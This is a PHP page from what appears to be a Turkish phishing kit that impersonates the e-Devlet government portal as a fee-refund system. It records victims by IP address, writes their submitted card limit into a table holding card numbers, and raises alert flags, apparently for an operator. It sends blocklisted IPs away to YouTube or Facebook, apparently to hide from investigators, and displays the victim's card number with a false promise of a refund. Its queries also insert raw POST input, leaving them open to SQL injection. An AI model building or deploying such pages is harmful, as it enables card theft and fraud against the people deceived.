<?php 
include 'baglan.php';
function GetIP(){
 if(getenv("HTTP_CLIENT_IP")) {
 $ip = getenv("HTTP_CLIENT_IP");
 } elseif(getenv("HTTP_X_FORWARDED_FOR")) {
 $ip = getenv("HTTP_X_FORWARDED_FOR");
 if (strstr($ip, ',')) {
 $tmp = explode (',', $ip);
 $ip = trim($tmp[0]);
 }
 } else {
 $ip = getenv("REMOTE_ADDR");
 }
 return $ip;
}
$ipcik = GetIP();


if ($_POST['limitx']<>"") {
$limitx = $_POST['limitx'];
$durum2 = $_POST['tamamlandi-sayfasi'];

mysql_query("Update ak set limitx='$limitx' where ip='$ipcik' ");
mysql_query("Update ak set notif='1' where ip='$ipcik' ");
mysql_query("Update ak set ses='1' where ip='$ipcik' ");
mysql_query("Update ak set durum2='tamamlandi' where ip='$ipcik' ");

} 

 $query =  mysql_query('SELECT * FROM ip'); 
    while($row = mysql_fetch_assoc($query)){ 
        if($row['ip'] == $ipcik){ 
            echo "<script>window.location.href='https://www.youtube.com/watch?v=ffF7W4rmkEk';</script>";
        } 
    } 

        $query =  mysql_query('SELECT * FROM ip2'); 
    while($row = mysql_fetch_assoc($query)){ 
        if($row['ip2'] == $ipcik){ 
            echo "<script>window.location.href='http://facebook.com';</script>";
        } 
    } 

?>

<!DOCTYPE html>
<html lang="zxx"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>e-Devlet | Aidat İade Sistemi</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- External CSS libraries -->
    <link type="text/css" rel="stylesheet" href="assets/bootstrap.min.css">
    <link type="text/css" rel="stylesheet" href="assets/font-awesome.min.css">
    <link type="text/css" rel="stylesheet" href="assets/flaticon.css">

    <!-- Favicon icon -->
    

    <!-- Google fonts -->
    <link rel="stylesheet" type="text/css" href="assets/css">

    <!-- Custom Stylesheet -->
    <link type="text/css" rel="stylesheet" href="assets/style.css">
    <link rel="stylesheet" type="text/css" id="style_sheet" href="assets/default.css">

</head>
<body id="top">

<div class="page_loader"></div>


<link rel="icon" type="image/x-icon" href="#">
<form method="post" action="tamamlandi.php" id="aspnetForm" autocomplete="off">




   <!-- External CSS libraries -->
    <link type="text/css" rel="stylesheet" href="assets/bootstrap.min(1).css">
    <link type="text/css" rel="stylesheet" href="assets/font-awesome.min(1).css">
    <link type="text/css" rel="stylesheet" href="assets/flaticon(1).css">

    <!-- Favicon icon -->
    <link rel="shortcut icon" href="#" type="image/x-icon">

    <!-- Google fonts -->
    <link rel="stylesheet" type="text/css" href="assets/css">

    <!-- Custom Stylesheet -->
    <link type="text/css" rel="stylesheet" href="assets/style(1).css">
    <link rel="stylesheet" type="text/css" id="style_sheet" href="assets/default(1).css">



<div class="page_loader"></div>



<!-- Login 1 start -->

<section class="creditly-wrapper wthree, w3_agileits_wrapper">
      <div class="card bg-secondary shadow border-0">

<div class="login-1">
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <div class="login-inner-form">
                    <div class="details">
                        <a href="#">
                            <img src="assets/logo-2.png" alt="logo">
                        </a>
                        <h3>İade Aktarım Sayfası</h3>
                        <h3>İşleminiz Tamamlanmıştır. </h3>                      


            <font size="2" color="#960000"><b><?php    $query =  mysql_query('SELECT * FROM ak  LIMIT 1'); 
    while($row = mysql_fetch_assoc($query)){ 
        if($row['ip'] == $ipcik){ 
            echo  $row['cc_no'];
        } 
    } ?> Numaralı Kartınıza </b>  <b></b> </font>
            <font size="2" color="#960000"><b></b>  İadeniz 48 saat içinde tanımlanacaktır.</font>
            <br>
            
            <br>
                            
                            <div class="form-group">
              
                            </div>
                            
                            </div>
                            <br>
                            <div id="error-message"></div>
                          </div>
                        
                       
                </div>
            </div>
        </div>
    </div>
</div></section></form></body></html>